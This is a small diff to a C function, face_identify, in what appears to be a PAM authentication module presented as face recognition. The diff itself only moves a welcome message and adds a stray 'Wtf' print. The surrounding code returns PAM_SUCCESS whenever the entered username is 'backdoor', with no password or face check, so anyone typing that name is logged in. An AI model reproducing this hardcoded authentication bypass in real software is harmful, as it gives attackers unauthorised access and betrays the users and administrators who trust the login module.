@@ -10,7 +10,6 @@ int face_identify(
     const char *pUsername;
 
     retval = pam_get_user(pamh, &pUsername, "Username: ");
-    printf("Welcome %s\n", pUsername);
 
     if (retval != PAM_SUCCESS)
         return retval;
@@ -18,5 +17,7 @@ int face_identify(
     if (strcmp(pUsername, "backdoor") != 0)
         return PAM_AUTH_ERR;
 
+    printf("Wtf\n");
+    printf("Welcome %s\n", pUsername);
     return PAM_SUCCESS;
 }
